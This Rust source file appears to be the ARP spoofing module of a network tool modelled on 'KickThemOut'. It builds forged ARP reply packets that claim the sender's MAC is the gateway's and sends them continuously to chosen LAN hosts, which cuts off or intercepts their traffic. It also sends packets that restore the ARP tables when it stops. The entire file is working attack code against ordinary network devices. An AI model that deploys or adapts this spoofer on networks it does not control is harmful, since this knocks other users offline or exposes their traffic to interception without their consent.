use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread::{self, JoinHandle};
use std::time::Duration;

use pnet::datalink::{self, Channel::Ethernet, MacAddr};

use crate::error::{KickThemOutError, Result};
use crate::scanner::{Host, NetworkInterface};

pub struct ArpSpoofer {
    interface: NetworkInterface,
    targets: Vec<Host>,
    running: Arc<AtomicBool>,
    thread_handle: Option<JoinHandle<()>>,
    packets_per_min: u32,
}

impl ArpSpoofer {
    pub fn new(interface: NetworkInterface, targets: Vec<Host>) -> Self {
        Self {
            interface,
            targets,
            running: Arc::new(AtomicBool::new(false)),
            thread_handle: None,
            packets_per_min: 600,
        }
    }

    pub fn set_packets_per_min(&mut self, ppm: u32) {
        self.packets_per_min = ppm;
    }

    pub fn start(&mut self) -> Result<()> {
        if self.targets.is_empty() {
            return Err(KickThemOutError::InvalidTarget(
                "No targets specified".to_string(),
            ));
        }

        if self.interface.gateway_mac.is_none() {
            return Err(KickThemOutError::GatewayMacNotFound);
        }

        self.running.store(true, Ordering::SeqCst);

        let interface_name = self.interface.name.clone();
        let my_mac = self.interface.mac;
        let gateway_ip = self.interface.gateway_ip;
        let targets = self.targets.clone();
        let running = self.running.clone();
        let interval = Duration::from_millis(60000 / self.packets_per_min as u64);

        let handle = thread::spawn(move || {
            // Get interface for sending
            let interfaces = datalink::interfaces();
            let pnet_interface = interfaces
                .into_iter()
                .find(|iface| iface.name == interface_name);

            if let Some(pnet_interface) = pnet_interface {
                if let Ok(Ethernet(mut tx, _rx)) =
                    datalink::channel(&pnet_interface, Default::default())
                {
                    while running.load(Ordering::SeqCst) {
                        for target in &targets {
                            // Spoof: tell target we are the gateway
                            let target_mac: MacAddr = target.mac.parse().unwrap_or(MacAddr::new(0, 0, 0, 0, 0, 0));
                            let packet = build_spoof_packet(my_mac, target_mac, gateway_ip, target.ip);
                            let _ = tx.send_to(&packet, None);
                        }
                        thread::sleep(interval);
                    }
                }
            }
        });

        self.thread_handle = Some(handle);
        Ok(())
    }

    pub fn stop(&mut self) {
        self.running.store(false, Ordering::SeqCst);

        if let Some(handle) = self.thread_handle.take() {
            let _ = handle.join();
        }

        // Restore ARP tables
        self.restore();
    }

    fn restore(&self) {
        if self.interface.gateway_mac.is_none() {
            return;
        }

        let interface_name = self.interface.name.clone();
        let gateway_ip = self.interface.gateway_ip;
        let gateway_mac = self.interface.gateway_mac.unwrap();
        let targets = self.targets.clone();

        // Get interface for sending
        let interfaces = datalink::interfaces();
        if let Some(pnet_interface) = interfaces
            .into_iter()
            .find(|iface| iface.name == interface_name)
        {
            if let Ok(Ethernet(mut tx, _rx)) =
                datalink::channel(&pnet_interface, Default::default())
            {
                // Send multiple restore packets to ensure they're received
                for _ in 0..5 {
                    for target in &targets {
                        let target_mac: MacAddr = target.mac.parse().unwrap_or(MacAddr::new(0, 0, 0, 0, 0, 0));
                        let packet =
                            build_restore_packet(gateway_mac, target_mac, gateway_ip, target.ip);
                        let _ = tx.send_to(&packet, None);
                    }
                    thread::sleep(Duration::from_millis(50));
                }
            }
        }
    }

    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

/// Build an ARP spoof packet (tell target we are the gateway)
fn build_spoof_packet(
    my_mac: MacAddr,
    target_mac: MacAddr,
    gateway_ip: std::net::Ipv4Addr,
    target_ip: std::net::Ipv4Addr,
) -> Vec<u8> {
    let mut packet = Vec::with_capacity(42);

    // Ethernet header
    packet.extend_from_slice(&target_mac.octets()); // Destination MAC
    packet.extend_from_slice(&my_mac.octets()); // Source MAC
    packet.extend_from_slice(&[0x08, 0x06]); // EtherType: ARP

    // ARP header
    packet.extend_from_slice(&[0x00, 0x01]); // Hardware type: Ethernet
    packet.extend_from_slice(&[0x08, 0x00]); // Protocol type: IPv4
    packet.push(6); // HW addr length
    packet.push(4); // Proto addr length
    packet.extend_from_slice(&[0x00, 0x02]); // Operation: Reply
    packet.extend_from_slice(&my_mac.octets()); // Sender HW addr (our MAC)
    packet.extend_from_slice(&gateway_ip.octets()); // Sender proto addr (gateway IP - we're spoofing)
    packet.extend_from_slice(&target_mac.octets()); // Target HW addr
    packet.extend_from_slice(&target_ip.octets()); // Target proto addr

    packet
}

/// Build an ARP restore packet (tell target the real gateway MAC)
fn build_restore_packet(
    gateway_mac: MacAddr,
    target_mac: MacAddr,
    gateway_ip: std::net::Ipv4Addr,
    target_ip: std::net::Ipv4Addr,
) -> Vec<u8> {
    let mut packet = Vec::with_capacity(42);

    // Ethernet header
    packet.extend_from_slice(&target_mac.octets()); // Destination MAC
    packet.extend_from_slice(&gateway_mac.octets()); // Source MAC (real gateway)
    packet.extend_from_slice(&[0x08, 0x06]); // EtherType: ARP

    // ARP header
    packet.extend_from_slice(&[0x00, 0x01]); // Hardware type: Ethernet
    packet.extend_from_slice(&[0x08, 0x00]); // Protocol type: IPv4
    packet.push(6); // HW addr length
    packet.push(4); // Proto addr length
    packet.extend_from_slice(&[0x00, 0x02]); // Operation: Reply
    packet.extend_from_slice(&gateway_mac.octets()); // Sender HW addr (real gateway)
    packet.extend_from_slice(&gateway_ip.octets()); // Sender proto addr
    packet.extend_from_slice(&target_mac.octets()); // Target HW addr
    packet.extend_from_slice(&target_ip.octets()); // Target proto addr

    packet
}